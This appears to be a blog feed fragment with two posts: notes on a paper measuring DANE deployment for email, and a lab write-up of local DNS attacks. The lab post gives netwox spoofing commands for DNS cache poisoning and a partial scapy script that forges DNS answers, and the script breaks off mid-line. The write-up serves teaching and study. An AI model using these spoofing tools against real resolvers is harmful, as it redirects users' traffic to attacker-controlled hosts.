    <content type="html"><![CDATA[<h1 id="电子邮件中DANE生态系统的纵向综合研究"><a href="#电子邮件中DANE生态系统的纵向综合研究" class="headerlink" title="电子邮件中DANE生态系统的纵向综合研究"></a>电子邮件中DANE生态系统的纵向综合研究</h1><h2 id="主要问题"><a href="#主要问题" class="headerlink" title="主要问题"></a>主要问题</h2><ul><li><p>背景和地位：这篇论文研究了什么问题，处于该领域什么地位（相对之前工作有什么区别）</p></li><li><p>idea和设计：基于什么核心idea展开，怎么设计的系统（包括哪几部分、各自的作用是什么）</p></li><li><p>实现细节：实现上解决的挑战性问题、解决方法</p></li><li><p>实验结果：哪些实验结果，各自表明了什么</p></li></ul><ul><li>总结：这篇论文的主要贡献是什么，有什么启发</li></ul><h2 id="参考blog"><a href="#参考blog" class="headerlink" title="参考blog"></a>参考blog</h2><p><a href="https://blog.csdn.net/weixin_43734095/article/details/106560271" target="_blank" rel="noopener">PKI技术</a></p><p><a href="https://wenku.baidu.com/view/dfb27f2fcfc789eb172dc8bd.html" target="_blank" rel="noopener">DNSSEC原理与部署情况–段海新</a></p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h3 id="对于协议的依赖-采用"><a href="#对于协议的依赖-采用" class="headerlink" title="对于协议的依赖/采用"></a>对于协议的依赖/采用</h3><ul><li>采用的是TLS（Transport layer Security）协议，并且加上PKI(Public Key Infrastructure 公钥基础设施)</li><li><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/1-1.PNG" srcset="/img/loading.gif" alt="PKI的主要要素">)<img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/1-2.PNG" srcset="/img/loading.gif" alt="当前PKI模型图片"></li></ul><p>可以根据上面图片以及introduction的内容看到根CA要具有自签名证书</p><ul><li>过程存在的问题：证书的验证过程仍然依赖于CAs（那么这些是否都是可信的）</li></ul><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><ul><li><p>目的：概述DNS、DNSSEC以及DANE并且理解是怎么协同工作来保证电子邮件的传输安全的</p><p>  <img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-8.PNG" srcset="/img/loading.gif" alt="2-8"></p></li></ul><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS维护着域名和关联值之间的记录，比如mail服务器（MX）和IPv4地址（A）之间的关联，但是DNS很容易遭受DNS攻击，比如DNS缓存中毒、DNS劫持等等，可参考之前的blog，所以引入了DNSSEC（DNS安全扩展）</p><h3 id="DNSSEC"><a href="#DNSSEC" class="headerlink" title="DNSSEC"></a>DNSSEC</h3><p>DNSSEC要解决的问题以及DNSSEC的原理</p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>DNSSEC的雏形，使用非对称加密，这样不用引入CA，可以通过数字签名来实现</p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/3--6.PNG" srcset="/img/loading.gif" alt="3--6"></p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-1.PNG" srcset="/img/loading.gif" alt="DNSSEC雏形"></p><p>新加入的记录类型</p><ul><li>DNSKEY 包含在DNSSEC中用的公钥</li><li>RRSIG：服务器用私钥对于RR记录上的加密</li><li>DS：DNSKEY的哈希，可以构建信任链</li></ul><h3 id="DANE"><a href="#DANE" class="headerlink" title="DANE"></a>DANE</h3><ul><li><p>是一种Internet security协议，允许证书被绑定到域名上面</p></li><li><p>引入了额外的记录类型：TLSA（特定位置存储，端口号，协议，基础域名的组合）</p></li><li><p>TLSA记录的组成：证书的使用、选择器、匹配类型以及证书关联数据，DNSSEC可以用来保证TLSA记录的完整性和真实性</p></li></ul><h3 id="DANE-amp-SMTP"><a href="#DANE-amp-SMTP" class="headerlink" title="DANE&amp;SMTP"></a>DANE&amp;SMTP</h3><ul><li><p>SMTP采用的是明文传输，在刚开始阶段引入了STARTTLS来进行加密传输，但是有可能遭到降级风险，因为在SMTP最开始阶段，接收邮件服务器（TLS server端）会纯文本形式发送”STRATTLS”来表明支持STARTTLS，来将不安全连接转化为安全连接</p><p>  <img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-9.PNG" srcset="/img/loading.gif" alt="2-9"></p><p>  降级风险图示，是发生在SMTP建立连接的阶段，通过MITM攻击来实现</p><p>  <img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-5.png" srcset="/img/loading.gif" alt="2-5"></p></li><li><p>而引入DANE协议后的SMTP传输相比于前面的更加安全，我认为这是通过将CA绑定到域名并且存储在DNS server上面从而避免了在刚开始SMTP连接建立阶段时邮件发送方服务器和邮件接收方服务器的”公开商议”，我认为是能够不再像上面一样容易遭受MITM攻击的</p><p>  图示</p><p>  <img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-6.png" srcset="/img/loading.gif" alt="2-6"></p></li></ul><ul><li><p><strong>DANE如何与DNSSEC以及STARTTLS一起工作</strong>，图示</p><p>  <img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><ul><li>通过DNSSEC链验证来保证TLSA记录的真实性以及完整性，每个RRSIG都是一个记录集通过DNSKEY的签名/加密（比如TLSAs），DS由子区域上传。在DNSSEC链验证之后，邮件发送方服务器（先发送TLS req，之后接受certificate）通过接受来自邮件接收方服务器（TLS服务器）的certificate来进行验证TLSA记录，如果验证通过，则进行TLS连接的建立</li></ul></li><li><p>DANE只有在所有的实体都正常运行时才能够执行正确的功能</p></li></ul><h2 id="分析提纲"><a href="#分析提纲" class="headerlink" title="分析提纲"></a>分析提纲</h2><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-10.PNG" srcset="/img/loading.gif" alt="2-10"></p><h3 id="DANE部署情况及对应研究"><a href="#DANE部署情况及对应研究" class="headerlink" title="DANE部署情况及对应研究"></a>DANE部署情况及对应研究</h3><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><ul><li><p>通过分析电子邮件服务器的配置来研究电子邮件应用当中的DANE PKI部署情况</p><p>  对于TLD（Top level Domain，顶级域名）中TLSA记录进行统计（因为在进行DANE协议应用的时候，一定会用到TLSA记录，可以来作为部署情况的衡量标准）</p><p>  <img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/2-11.PNG" srcset="/img/loading.gif" alt="2-11"></p></li></ul><h4 id="纵向研究（随时间的变化）"><a href="#纵向研究（随时间的变化）" class="headerlink" title="纵向研究（随时间的变化）"></a>纵向研究（随时间的变化）</h4><ul><li><p><strong>数据集</strong></p><p>  通过关注<strong>权威DNS服务器</strong>来实现大规模的纵向测量</p><p>  选择了.com，.net和.org三个TLD因为是最大的顶级通用域，而选择.nl和.se两个国家域是因为显示了DNSSEC部署的比例高</p><p>  <strong>获取数据的方式：</strong>首先提取SOA、DNSKEY记录以及对应RRSIG和MX记录 </p></li><li><p><strong>DANE的流行程度</strong></p><p>  关注点为：至少为MX记录（SMTP相关）提供/发布了一个TLSA记录的二级域名的数量，图解</p><p>  <img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>  数据图如下</p><p>  <img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>  <strong>observation</strong></p><ul><li>MX记录和TLSA记录都在稳步增长</li><li>发现在两个国家域名DNSSEC部署比例上面较高，这是由于注册中心的财政激励</li><li>电子邮件托管服务在SMTP DANE的部署中扮演着重要的角色</li></ul></li><li><p><strong>注意</strong></p><p>  仅通过分析TLSA记录无法判断这些域是否正确的部署了DANE，还需要观察TLSA记录<strong>是否被正确签名、是否支持STARTTLS来提交证书、证书与TLSA记录是否一致</strong>，之后会对是否正确运行DANE进行更详细的检查</p></li></ul><h3 id="DANE-management分析"><a href="#DANE-management分析" class="headerlink" title="DANE management分析"></a>DANE management分析</h3><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><ul><li><p><strong>研究目标</strong>：具有MX和TLSA记录的域是否采取了必要的步骤来正确的支持DANE，并且理解具有MX和TLSA记录的域是如何deploy and operate DANE的</p></li><li><p><strong>数据集/数据来源</strong></p><ul><li><p>MX记录中显示的邮件服务器所提供的所有的证书</p></li><li><p>以及相应的TLSA记录</p></li><li><p><strong>从发布TLSA记录的邮件服务器中获取证书的方法</strong></p><p>  从之前的数据集中获取所有的MX和TLSA记录</p><p>  之后开发一个measurement SMTP客户端，通关建立SMTP连接来连接到MX记录对应的电子邮件服务器。之后向电子邮件服务器发送STARTTLS来进行请求，从而获得证书并且每小时获取/刷新</p></li></ul></li><li><p><strong>missing component</strong></p><ul><li><p>检查发布TLSA记录的域是否也发布所有必须的DNSSEC记录以及是否支持STARTTLS，根据图片可以看到80%的TLSA都是已签名的（用DNSSEC中存储的公钥对应的私钥加密），也就是具有RRSIG记录</p></li><li><p>之后开始考虑MX记录上的电子邮件服务器（一般是接收电子邮件服务器），可以得到因为无法通过STARTTLS连接的已建立SMTP连接的比例，也就是说TLS server端并不支持STARTTLS，平均故障率为0.2%，而由于缺少DS记录而导致故障的比例为20%</p></li><li><p>所以，DANE正确部署失败的主要原因是由于缺少DS记录</p></li></ul></li></ul><h3 id="客户端DANE支持（电子邮件服务提供商）"><a href="#客户端DANE支持（电子邮件服务提供商）" class="headerlink" title="客户端DANE支持（电子邮件服务提供商）"></a>客户端DANE支持（电子邮件服务提供商）</h3><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p><p>具体分析过程如下：</p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p><p>最后在验证过程中，如果我们的server端没有收到错误配置的测试子域的电子邮件，就意味着电子邮件服务提供山已经正确验证了错误配置的子域，并且决定不发送电子邮件</p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/4-4.PNG" srcset="/img/loading.gif" alt="4-4"></p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/4-5.PNG" srcset="/img/loading.gif" alt="4-5"></p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/4-6.PNG" srcset="/img/loading.gif" alt="4-6"></p><p>现在已经能够粗略的了解到那些电子邮件服务提供商能够正确支持DANE，但是之后仍要进行对于协议来进行细致分析，判断哪些协议能够被支持，哪些不被支持，所以要测试每一个协议</p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/4-7.PNG" srcset="/img/loading.gif" alt="4-7"></p><p>4种流行的SMTP软件对于STARTTLS和DANE支持的实验结果</p><p><img src="/2020/11/14/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E4%B8%ADDANE%E7%94%9F%E6%80%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BA%B5%E5%90%91%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/4-8.PNG" srcset="/img/loading.gif" alt="4-8"></p><p>10中流行的DNS软件实现对于DNSSEC和DANE(TLSA记录的实验结果)</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2>]]></content>
    
    
    
    <tags>
      
      <tag>移动安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Local DNS attack</title>
    <link href="/2020/11/13/Local-DNS-attack/"/>
    <url>/2020/11/13/Local-DNS-attack/</url>
    
    <content type="html"><![CDATA[<h1 id="Local-DNS-Attack"><a href="#Local-DNS-Attack" class="headerlink" title="Local DNS Attack"></a>Local DNS Attack</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li><p>DNS（Domain name system）域名系统是工作在应用层上面，是对域名和IP地址进行转换的，类似于ARP和RARP协议</p></li><li><p>在这里我们所要攻击的目标是本地的DNS服务器</p></li><li><p>整个基本DNS的基本实现思路</p><p>  <img src="/2020/11/13/Local-DNS-attack/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p></li></ul><h2 id="Part-Ⅰ"><a href="#Part-Ⅰ" class="headerlink" title="Part Ⅰ"></a>Part Ⅰ</h2><h3 id="task-1：配置用户机器"><a href="#task-1：配置用户机器" class="headerlink" title="task 1：配置用户机器"></a>task 1：配置用户机器</h3><p>用sudo vi head来编辑head文件</p><p><img src="/2020/11/13/Local-DNS-attack/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p>同时检查/etc/resolv.conf，将其他nameserver进行注解，保证只有一个nameserver只想我们需要的本地DNS服务器（每次重启都需要进行检查）</p><p><img src="/2020/11/13/Local-DNS-attack/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><p>之后进行测试，输入下面命令</p><pre><code class="hljs css"><span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span></code></pre><p>之后可以在用户机器上面用wireshark抓到对应的包</p><p><img src="/2020/11/13/Local-DNS-attack/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p><p>可以看到<strong>用户机器（10.0.2.4）</strong>向<strong>本地DNS服务器（10.0.2.5）</strong>发送了DNS请求并且本地DNS服务器进行了回复</p><h3 id="task-2：建立一个本地DNS服务器"><a href="#task-2：建立一个本地DNS服务器" class="headerlink" title="task 2：建立一个本地DNS服务器"></a>task 2：建立一个本地DNS服务器</h3><p>按照步骤来进行修改对应的文件</p><p><img src="/2020/11/13/Local-DNS-attack/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p>之后使用DNS服务器来进行查询，依旧是ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p>在本地的DNS服务器上面运行wireshark抓包，可以看到此时本地DNS服务器向一些DNS服务器进行询问</p><p><img src="/2020/11/13/Local-DNS-attack/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p>而之后再次在<strong>用户主机（10.0.2.4）</strong>上面ping <a href="http://www.baidu.com，会发现此时在**本地DNS服务器（10.0.2.5）**上面用wireshark抓包会发现没有对应的向其他DNS服务器询问的过程，而是直接访问了百度对应的主机" target="_blank" rel="noopener">www.baidu.com，会发现此时在**本地DNS服务器（10.0.2.5）**上面用wireshark抓包会发现没有对应的向其他DNS服务器询问的过程，而是直接访问了百度对应的主机</a></p><p><img src="/2020/11/13/Local-DNS-attack/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>可以看到没有访问根服务器来进行递归查询的过程</p><h3 id="task-3：在本地DNS服务器上面设置域"><a href="#task-3：在本地DNS服务器上面设置域" class="headerlink" title="task 3：在本地DNS服务器上面设置域"></a>task 3：在本地DNS服务器上面设置域</h3><ul><li><p>设置对应的区域</p><p>  <img src="/2020/11/13/Local-DNS-attack/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p></li><li><p>设置正向查找<strong>区域文件</strong>（实际DNS解析的存储的地方）</p><p>  <img src="/2020/11/13/Local-DNS-attack/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>  这里可以看到在进行查询的时候<a href="http://www.example.com会被定位到192.168.0.101" target="_blank" rel="noopener">www.example.com会被定位到192.168.0.101</a></p></li><li><p>反向查找的区域文件和上面一样即可</p></li><li><p>之后dig <a href="http://www.example.com，被定位到192.168.0.101" target="_blank" rel="noopener">www.example.com，被定位到192.168.0.101</a></p><p>  <img src="/2020/11/13/Local-DNS-attack/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p></li></ul><h2 id="Part-Ⅱ"><a href="#Part-Ⅱ" class="headerlink" title="Part Ⅱ"></a>Part Ⅱ</h2><ul><li><p>基本原理：在用户机器发送了一个DNS请求报文之后，攻击者伪造一个DNS response报文，将对应的域名定位到一台恶意主机</p><p>  <img src="/2020/11/13/Local-DNS-attack/4-0.PNG" srcset="/img/loading.gif" alt="4-0"></p></li></ul><h3 id="task-4：修改主机文件"><a href="#task-4：修改主机文件" class="headerlink" title="task 4：修改主机文件"></a>task 4：修改主机文件</h3><ul><li><p>原理：在用户主机上面保存着一些host name和IP地址对应关系的条目，位于/etc/hosts中，这用来进行本地查找，并且会优先与DNS查询来进行，在这里进行修改的是<strong>用户主机</strong></p></li><li><p>具体实现：</p><ul><li><p>首先在进行修改HOST文件之前进行ping</p><p>  <img src="/2020/11/13/Local-DNS-attack/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p></li><li><p>之后对HOST文件进行修改，选择将其重定位到百度的IP</p></li><li><p>然后重新进行ping</p><p>  <img src="/2020/11/13/Local-DNS-attack/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p><p>  会发现已经重定位到了百度的IP地址</p></li></ul></li></ul><h3 id="task-5：对用户直接欺骗响应"><a href="#task-5：对用户直接欺骗响应" class="headerlink" title="task 5：对用户直接欺骗响应"></a>task 5：对用户直接欺骗响应</h3><ul><li><p>原理：嗅探与欺骗，一些要求如下</p><blockquote><ol><li>The source IP address must match the IP address of the DNS server. </li><li>The destination IP address must match the IP address of the user’s machine. </li><li>The source port number (UDP port) must match the port number that the DNS request was sent to (usually port 53).</li><li>The destination port number must match the port number that the DNS request was sent from</li><li>The UDP checksum must be correctly calculated.</li><li>The transaction ID must match the transaction ID in the DNS request.</li><li>The domain name in the question section of the reply must match the domain name in the question section of the request.</li><li>The domain name in the answer section must match the domain name in the question section of the DNS request.</li><li>The User’s computer must receive the attacker’s DNS reply before it receives the legitimate DNS response.</li></ol></blockquote></li><li><p>具体实现：</p><ul><li><p>首先在进行运行命令之前dig</p><p>  <img src="/2020/11/13/Local-DNS-attack/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p></li><li><p>之后在<strong>attacker（10.0.2.7）</strong>查看一下netwox 105相关的东西</p><pre><code class="hljs routeros">Title: Sniff <span class="hljs-keyword">and</span> send<span class="hljs-built_in"> DNS </span>answersUsage: netwox 105 -h hostname -H<span class="hljs-built_in"> ip </span>-a hostname -A<span class="hljs-built_in"> ip </span>[-d device]Parameters: -h|--hostname hostname         hostname &#123;www.example.com&#125; -H|--hostnameip<span class="hljs-built_in"> ip </span>            hostname<span class="hljs-built_in"> IP </span>&#123;1.2.3.4&#125; -a|--authns hostname           authoritative name<span class="hljs-built_in"> server </span>&#123;ns.example.com&#125; -A|--authnsip<span class="hljs-built_in"> ip </span>              authns<span class="hljs-built_in"> IP </span>&#123;1.2.3.5&#125; -d|--device device             device name &#123;Eth0&#125; --help2                        display help <span class="hljs-keyword">for</span> advanced parametersExample: netwox 105 -h <span class="hljs-string">"www.example.com"</span> -H <span class="hljs-string">"1.2.3.4"</span> -a <span class="hljs-string">"ns.example.com"</span> -A <span class="hljs-string">"1.2.3.5"</span>Example: netwox 105 --hostname <span class="hljs-string">"www.example.com"</span> --hostnameip <span class="hljs-string">"1.2.3.4"</span> --authns <span class="hljs-string">"ns.example.com"</span> --authnsip <span class="hljs-string">"1.2.3.5"</span></code></pre><p>运行相关命令，在此之前刷新本地DNS的缓存</p><pre><code class="hljs css"><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">netwox</span> 105 <span class="hljs-selector-tag">--hostname</span> "<span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.net</span>" <span class="hljs-selector-tag">--hostnameip</span> "1<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.4</span>" <span class="hljs-selector-tag">--authns</span> "<span class="hljs-selector-tag">ns</span><span class="hljs-selector-class">.example</span>" <span class="hljs-selector-tag">--authnsip</span> "1<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.5</span>"</code></pre></li><li><p>运行结果</p><p>  <img src="/2020/11/13/Local-DNS-attack/5-2.PNG" srcset="/img/loading.gif" alt="5-2"></p></li></ul></li></ul><h3 id="task-6：DNS缓存中毒攻击"><a href="#task-6：DNS缓存中毒攻击" class="headerlink" title="task 6：DNS缓存中毒攻击"></a>task 6：DNS缓存中毒攻击</h3><ul><li><p>在这里，因为按照上面方法攻击用户的话只能是每次用户发一个DNS请求就伪造一个DNS响应，所以我们采取攻击用户主机的本地DNS服务器的方式</p></li><li><p><img src="/2020/11/13/Local-DNS-attack/6-0.PNG" srcset="/img/loading.gif" alt="6-0"></p></li><li><p>具体实现：输入下面netwox命令</p>  <pre><code class="hljs css"><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">netwox</span> 105 <span class="hljs-selector-tag">--hostname</span> "<span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.net</span>" <span class="hljs-selector-tag">--hostnameip</span> "10<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.4</span>" <span class="hljs-selector-tag">--authns</span> "<span class="hljs-selector-tag">ns</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.net</span>" <span class="hljs-selector-tag">--authnsip</span> "10<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.5</span>" <span class="hljs-selector-tag">--ttl</span> 600 <span class="hljs-selector-tag">--filter</span> "<span class="hljs-selector-tag">src</span> <span class="hljs-selector-tag">host</span> 10<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.5</span>" <span class="hljs-selector-tag">--spoofip</span> <span class="hljs-selector-tag">raw</span></code></pre><p>  之后转存DNS缓存的内容，可以看到相应的欺骗的内容</p><p>  <img src="/2020/11/13/Local-DNS-attack/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p></li></ul><h3 id="task-7：DNS缓存中毒：针对权限部分"><a href="#task-7：DNS缓存中毒：针对权限部分" class="headerlink" title="task 7：DNS缓存中毒：针对权限部分"></a>task 7：DNS缓存中毒：针对权限部分</h3><p>在这里需要对于DNS报文格式、查询报文格式以及应答报文格式有所了解，参考blog：<a href="https://blog.csdn.net/liao152/article/details/45252387" target="_blank" rel="noopener">深入理解DNS报文格式</a></p><ul><li><p>这个task的原理就是在进行域名查询的时候进一步攻击DNS缓存，不仅仅是一个主机的映射，把整个域名映射到另一台DNS服务器上，而这台服务器是由attacker掌握的，这下就可以将原来域上的任何一个hostname映射到别的IP上面</p></li><li><p>具体实现：在attacker上面运行相应的嗅探和欺骗程序，之后在用户主机上面dig <a href="http://www.example.com命令" target="_blank" rel="noopener">www.example.com命令</a></p><p>  DNS报文格式</p><p>  <img src="/2020/11/13/Local-DNS-attack/6-2.PNG" srcset="/img/loading.gif" alt="6-2"></p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spoof_dns</span><span class="hljs-params">(pkt)</span>:</span>    <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">'www.example.net'</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname):        <span class="hljs-comment"># Swap the source and destination IP address</span>        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)        <span class="hljs-comment"># Swap the source and destination port number</span>        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)        <span class="hljs-comment"># The Answer Section</span>        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=<span class="hljs-string">'A'</span>,ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">'10.0.2.123'</span>)        <span class="hljs-comment"># The Authority Section</span>        NSsec1 = DNSRR(rrname=<span class="hljs-string">'example.net'</span>, type=<span class="hljs-string">'NS'</span>, ttl=<span 